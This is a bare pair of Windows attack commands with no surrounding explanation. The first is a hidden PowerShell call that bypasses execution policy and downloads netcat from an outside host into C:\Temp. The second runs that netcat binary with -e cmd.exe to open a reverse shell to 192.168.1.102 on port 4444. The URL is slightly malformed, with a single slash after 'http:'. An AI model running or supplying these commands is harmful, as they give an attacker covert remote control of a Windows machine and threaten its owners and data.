powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http:/megavirusdelamort.lestutosdeprocessus.fr/nc.zip','C:\Temp\nc.exe');"

C:\Temp\nc.exe -e cmd.exe 192.168.1.102 4444
